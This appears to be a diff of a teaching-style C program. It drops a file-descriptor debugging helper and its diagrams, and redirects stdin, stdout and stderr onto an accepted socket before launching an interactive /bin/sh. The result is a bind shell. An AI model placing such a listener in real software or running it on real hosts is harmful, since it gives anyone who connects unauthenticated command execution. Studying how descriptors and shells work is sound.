@@ -6,21 +6,6 @@
 #include <sys/socket.h> // for struct sockaddr, etc.
 #include <arpa/inet.h> // for inet_addr(), etc.
 
-void show_fds(void)
-{
-	char buf[4096];
-	char fpath[1024];
-
-	for(int i=0; i<256; ++i)
-	{
-		sprintf(fpath, "/proc/self/fd/%d", i);
-
-		int rc = readlink(fpath, buf, 4096);
-		if (rc >= 0)
-			printf("%d: %s\n", i, buf);
-	}
-}
-
 int main(int ac, char **av)
 {
 	int rc;
@@ -69,27 +54,11 @@ int main(int ac, char **av)
 	if (fd2 == -1)
 		{ perror("accept()"); goto cleanup; }
 
-	// DUP
-	// BEFORE:
-	//                      +-------------+
-	// [0] ---------------> |             |
-	// [1] ---------------> | /dev/pts/13 |
-	// [2] ---------------> |             |
-	//                      +-------------+
-	//                      +-------------+
-	// [3] ---------------> | socket      | 
-	//                      +-------------+
-	// AFTER:
-	//                      +-------------+
-	// [0] ---------------> |             |
-	// [1] ---------------> | socket      |
-	// [2] ---------------> |             |
-	// [3] ---------------> |             |
-	//                      +-------------+
-	show_fds();
-	printf("--------\n");
-	dup2(fd2, STDIN_FILENO);
-	show_fds();
+	// these close the descriptor, not the descriptee
+	// in other words, the virtual terminal
+	dup2(fd2, STDIN_FILENO); // close 0, make 0 describe socket
+	dup2(fd2, STDOUT_FILENO); // close 1, make 1 describe socket
+	dup2(fd2, STDERR_FILENO); // close 2, make 2 describe socket
 
 	// EXECVE
 	char *const child_argv[3] = {"/bin/sh", "-i", NULL};
